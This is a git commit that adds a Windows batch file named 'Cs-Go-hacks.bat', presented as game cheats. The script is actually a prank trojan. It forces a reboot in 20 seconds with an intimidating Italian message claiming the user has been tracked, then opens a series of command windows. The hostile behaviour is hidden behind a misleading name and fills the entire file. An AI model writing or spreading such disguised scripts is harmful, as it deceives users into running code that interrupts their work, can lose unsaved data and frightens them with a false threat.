365ada9b86f5152c6a780e3747662bcf1d8fd9b4
Raven3sonio <141159143+Raven3sonio@users.noreply.github.com>
2023-08-01 21:17:40 +0200

    Add files via upload

---
+++ Cs-Go-hacks.bat
@@ -0,0 +1,26 @@
+shutdown -r -c "Raven.exe ti ha rintracciato verrai presto disconnesso" -t 20
+start
+start
+start
+start
+start
+
+start
+start
+
+start
+start
+
+start
+start
+start
+
+start
+start
+start
+start 
+start
+start
+start
+start
+color red
